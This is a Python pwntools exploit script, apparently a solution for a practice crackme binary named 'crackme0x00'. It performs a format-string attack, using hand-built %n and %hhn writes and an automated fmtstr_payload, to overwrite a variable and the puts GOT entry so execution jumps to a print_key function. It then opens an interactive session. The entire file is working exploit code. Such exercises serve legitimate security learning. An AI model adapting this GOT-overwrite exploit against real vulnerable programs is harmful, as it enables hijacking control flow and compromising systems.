#!/usr/bin/env python2

# 0804a050 <- N
# 0x804a02c puts@got <- 0x08048726 $print_key

from pwn import *

PUTS_GOT = 0x804a02c

payload1 = [
    "AA",
    p32(0x0804a050),  # 15th
    p32(PUTS_GOT + 3),
    p32(PUTS_GOT + 2),
    p32(PUTS_GOT + 1),
    p32(PUTS_GOT + 0),
    "%15$n",
    "%" + str(0x100-0x28+0x08) + "c",
    "%16$hhn",
    "%" + str(0x100-0x08+0x04) + "c",
    "%17$hhn",
    "%" + str(0x87-0x04) + "c",
    "%18$hhn",
    "%" + str(0x100-0x87+0x26) + "c",
    "%19$hhn",
]

payload2 = [
    "AA",
    fmtstr_payload(15, {0x0804a050: 0x10, 0x804a02c: 0x08048726}, 20)
]


p = process("./crackme0x00")
p.sendline("".join(payload2))
p.interactive()
